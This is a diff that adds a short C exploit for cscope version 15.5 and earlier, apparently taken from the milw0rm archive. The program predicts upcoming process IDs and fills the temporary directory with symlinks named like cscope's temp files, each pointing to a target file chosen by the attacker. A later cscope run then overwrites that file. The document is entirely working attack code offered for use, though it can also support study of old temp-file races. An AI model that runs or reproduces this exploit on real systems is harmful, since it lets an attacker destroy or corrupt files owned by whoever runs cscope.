@@ -1,0 +1,39 @@
+/* RXcscope exploit version 15.5 and minor */
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BSIZE 64
+
+int
+main(int ac, char *av[]) {
+        pid_t cur;
+        u_int i=0, lst;
+        char buffer[BSIZE + 1];
+        
+        fprintf(stdout, "\n --[ Cscope Exploit ]--\n"\
+                        " version 15.5 and minor \n" \
+                        " Gangstuck / Psirac\n" \
+                        " <research@rexotec.com>\n\n");
+                        
+        if (ac != 3) {
+                fprintf(stderr, "Usage: %s <target> <max file creation>\n", av[0]);
+                return 1;
+        }
+        
+        cur=getpid();
+        lst=cur+atoi(av[2]);
+        
+        fprintf(stdout, " -> Current process id is ..... [%5d]\n" \
+                        " -> Last process id is ........ [%5d]\n", cur, lst);
+        
+        while (++cur != lst) {
+                snprintf(buffer, BSIZE, "%s/cscope%d.%d", P_tmpdir, cur, (i==2) ? --i : ++i);
+                symlink(av[1], buffer);
+        }
+
+        return 0;
+}
+
+// milw0rm.com [2004-12-17]
